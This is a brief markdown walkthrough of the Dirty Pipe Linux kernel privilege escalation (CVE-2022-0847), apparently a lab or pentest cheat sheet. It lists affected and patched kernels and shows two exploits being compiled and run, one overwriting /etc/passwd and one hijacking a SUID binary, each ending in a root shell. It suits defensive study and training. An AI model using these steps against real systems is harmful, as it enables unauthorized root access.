# CVE-2022-0847 - DirtyPipe - Linux - Privilege Escalation

Dirty Pipe (CVE-2022-0847) is a local privilege escalation vulnerability in the Linux kernel that could potentially allow an unprivileged user to do the following:

- Modify/overwrite arbitrary read-only files like /etc/passwd.
- Obtain an elevated shell.

Affected versions:

- kernels from version 5.8 to 5.17

So far the vulnerability has been patched in the following Linux kernel versions:

- 5.16.11
- 5.15.25
- 5.10.102

## Enumeration

```bash
$ uname -r

5.15.0-051500-generic
```

## Exploitation

## Exploit-1

```bash
$ gcc exploit-1.c -o exploit-1

$ ./exploit-1 

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id
uid=0(root) gid=0(root) groups=0(root)

```

## Exploit-2

```bash
$ gcc exploit-2.c -o exploit-2

$ ./exploit-2
Usage: ./exploit-2 SUID

$ find / -perm -4000 2>/dev/null
...
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
...

$ ./exploit-2 /usr/bin/mount

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id
uid=0(root) gid=0(root) groups=0(root),1000(student)
```

## Links

- [Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/)
- [GitHub - AlexisAhmed - PoC - CVE-2022-0847-DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
- [Mitre - CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)
